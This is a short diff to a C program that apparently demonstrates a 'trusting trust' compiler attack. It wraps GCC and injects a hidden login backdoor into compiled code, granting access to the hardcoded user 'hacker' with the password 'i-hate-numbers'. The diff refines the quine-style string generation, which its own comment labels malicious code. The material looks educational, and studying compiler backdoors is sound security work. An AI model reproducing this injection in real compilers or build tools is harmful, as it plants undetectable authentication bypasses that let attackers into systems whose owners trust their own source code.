@@ -37,7 +37,7 @@ int main(int argc, char *argv[]){
 	/* We pass the source code to GCC as the backend compiler */
 
 	const char * TEXT_INJECT_LOGIN = ""
-	"if(strcmp(username, \"hacker\") == 0 && strcmp(password, \"i-hate-numbers\") == 0){%c"
+	"if(strcmp(username, %chacker%c) == 0 && strcmp(password, %ci-hate-numbers%c) == 0){%c"
 	"%c%cprintf(TEXT_AUTHORISED);%c"
 	"%c%creturn 0;%c"
 	"%c}%c"
@@ -48,7 +48,7 @@ int main(int argc, char *argv[]){
 		char stringToInject[200];
 
 		//Generate malicious code
-		snprintf(stringToInject, 200, TEXT_INJECT_LOGIN, 10, 9, 9, 10, 9, 9, 10, 9, 10, 10, 9);
+		snprintf(stringToInject, 200, TEXT_INJECT_LOGIN, 34, 34, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 10, 10, 9);
 
 		int lengthOfMaliciousCode = strlen(stringToInject);
 
